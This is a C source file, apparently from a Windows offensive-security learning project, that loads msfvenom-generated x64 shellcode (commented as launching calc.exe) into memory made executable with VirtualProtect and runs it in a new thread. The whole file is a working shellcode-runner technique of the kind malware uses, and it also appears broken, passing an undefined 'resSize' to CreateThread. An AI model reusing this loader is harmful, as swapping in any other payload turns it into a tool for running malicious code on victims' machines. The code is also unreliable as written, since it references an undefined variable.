#include <windows.h>
#include <stdio.h>
#include "../utils/utility.h"

int main(int argc, char const *argv[])
{
    DWORD   oldProtection;
    HANDLE  threadHandle;
// msfvenom -p windows/x64/exec CMD="cmd.exe /C calc.exe" EXITFUNC=thread
// --platform windows -a x64 -b "\x00\x0a\x0d" -f c -v exec
    unsigned char exec[] = 
"\x48\x31\xc9\x48\x81\xe9\xdc\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xeb\xab\x67\xe3\x7c\x35\x8e\xa5\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x17\xe3\xe4"
"\x07\x8c\xdd\x4e\xa5\xeb\xab\x26\xb2\x3d\x65\xdc\xf4\xbd"
"\xe3\x56\x31\x19\x7d\x05\xf7\x8b\xe3\xec\xb1\x64\x7d\x05"
"\xf7\xcb\xe3\xec\x91\x2c\x7d\x81\x12\xa1\xe1\x2a\xd2\xb5"
"\x7d\xbf\x65\x47\x97\x06\x9f\x7e\x19\xae\xe4\x2a\x62\x6a"
"\xa2\x7d\xf4\x6c\x48\xb9\xea\x36\xab\xf7\x67\xae\x2e\xa9"
"\x97\x2f\xe2\xac\xbe\x0e\x2d\xeb\xab\x67\xab\xf9\xf5\xfa"
"\xc2\xa3\xaa\xb7\xb3\xf7\x7d\x96\xe1\x60\xeb\x47\xaa\x7d"
"\xe5\x6d\xf3\xa3\x54\xae\xa2\xf7\x01\x06\xed\xea\x7d\x2a"
"\xd2\xb5\x7d\xbf\x65\x47\xea\xa6\x2a\x71\x74\x8f\x64\xd3"
"\x4b\x12\x12\x30\x36\xc2\x81\xe3\xee\x5e\x32\x09\xed\xd6"
"\xe1\x60\xeb\x43\xaa\x7d\xe5\xe8\xe4\x60\xa7\x2f\xa7\xf7"
"\x75\x92\xec\xea\x7b\x26\x68\x78\xbd\xc6\xa4\x3b\xea\x3f"
"\xa2\x24\x6b\xd7\xff\xaa\xf3\x26\xba\x3d\x6f\xc6\x26\x07"
"\x8b\x26\xb1\x83\xd5\xd6\xe4\xb2\xf1\x2f\x68\x6e\xdc\xd9"
"\x5a\x14\x54\x3a\xab\xc6\x34\x8e\xa5\xeb\xab\x67\xe3\x7c"
"\x7d\x03\x28\xea\xaa\x67\xe3\x3d\x8f\xbf\x2e\x84\x2c\x98"
"\x36\xc7\xd5\x93\x8f\xe1\xea\xdd\x45\xe9\x88\x13\x5a\x3e"
"\xe3\xe4\x27\x54\x09\x88\xd9\xe1\x2b\x9c\x03\x09\x30\x35"
"\xe2\xf8\xd9\x08\x89\x7c\x6c\xcf\x2c\x31\x54\xb2\x80\x11"
"\x51\xa0\xc0\x93\xce\x47\xcc\x3f\x15\xed\xc4\x87\xc8\x49"
"\x86\x04\x50\x8e\xa5";


    size_t execSize = sizeof(exec);

    void *func = VirtualAlloc(0, execSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(func, exec, execSize);
    if (VirtualProtect(func, execSize, PAGE_EXECUTE_READWRITE, &oldProtection) == 0){
        MESSAGE(FAIL, "Impossible to change the protection of the allocated space in the current process\n");
        PRINT_ERROR(VirtualProtect);
        return EXIT_FAILURE;
    }
    MESSAGE(INFO, "Protection Successfully changed at: 0x%p\n", func);

    MESSAGE(INFO, "Press <enter> to run bytes code...")
    getchar();
    
    //((void(*)())func)();
    threadHandle = CreateThread(NULL, resSize, (LPTHREAD_START_ROUTINE)func, NULL, 0, NULL);
    if ( threadHandle == NULL){
        MESSAGE(FAIL, "Impossible to create thread\n");
        PRINT_ERROR(CreateThread);
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "Thread started\n");
    WaitForSingleObject(threadHandle, INFINITE);

    return EXIT_SUCCESS;
}
